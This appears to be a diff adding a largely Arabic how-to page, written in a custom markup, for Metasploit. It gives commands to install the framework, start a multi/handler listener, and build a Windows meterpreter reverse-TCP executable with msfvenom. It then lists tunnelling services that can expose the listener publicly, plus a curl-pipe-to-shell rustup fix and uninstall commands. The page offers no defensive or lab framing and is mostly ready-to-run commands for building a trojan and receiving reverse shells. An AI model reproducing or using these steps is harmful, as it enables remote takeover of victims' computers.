@@ -1,0 +1,75 @@
+
+
+
+
+title'امر تثبيت:'
+
+code'curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \  chmod 755 msfinstall && \ ./msfinstall'
+
+title'امر فتح سرفر:'
+
+code'msfconsole'
+
+code'use exploit/multi/handler'
+code'set payload windows/meterpreter/reverse_tcp'
+code'set lhost 'd'your ip localhost like'code' set lhost 192.168.1.5'
+
+code'set lport'd'any port here like'code'set lport 8080'
+
+code'run'
+
+
+
+title'make file payload'
+
+code'msfvenom --list-payloads'
+
+code'msfvenom -p 'd'any payload here'code' -o 'd'any name file and in last add .exe or type program your system'code' -f 'd'type program your system'code' lhost='d'here your ip localhost'code' lport='d'any port''
+
+d'like'
+
+code'msfvenom -p windows/meterpreter/reverse_tcp -o client.exe -f exe lhost=192.168.1.5 lport=8080'
+
+
+
+title'امر اصلاح مشكله تحديث الريست لو ظهرتلكم:'
+
+code`RUSTUP_INIT_SKIP_PATH_CHECK=yes curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y`
+
+
+
+space''
+title'سرفرات ال اتكلمت عنها:'
+
+
+title'playit.gg' d'– خدمة تتيح لك تشغيل سيرفرات ألعاب من جهازك بدون فتح بورتات على الراوتر.' link'playit.gg' d'official site'
+
+title'Ngrok' d'– منصة معروفة لإنشاء نفق آمن يربط جهازك بالإنترنت بدون port forwarding.' link'ngrok.com' d'official site'
+
+title'Pinggy' d'– خدمة سهلة لإنشاء HTTP/TCP/UDP tunnels لمشاريعك أو سيرفراتك.' link'pinggy.io' d'official site'
+
+title'Portmap.io' d'– خدمة port forwarding عبر OpenVPN/SSH بدون الحاجة لــ NAT/CG‑NAT.' link'portmap.io' d'official site'
+
+title'LocalXpose' d'– أداة لإنشاء نفق يربط localhost بالعالم الخارجي بسرعة وأمان.' link'localxpose.io' d'official site'
+
+title'Cloudflare Tunnel' d'– أداة من Cloudflare لإنشاء نفق آمن لخدماتك بدون فتح بورتات، مع دعم HTTPS وConnects عبر شبكتهم العالمية. Cloudflare Tunnel docs (official)'
+
+
+
+
+
+title'امر الغاء تثبيت ميتسبليت: '
+
+code'apt remove metasploit-framework -y && sudo rm -rf /opt/metasploit-framework && rm -rf ~/.msf4'
+
+
+
+
+
+
+
+
+
+
+
+
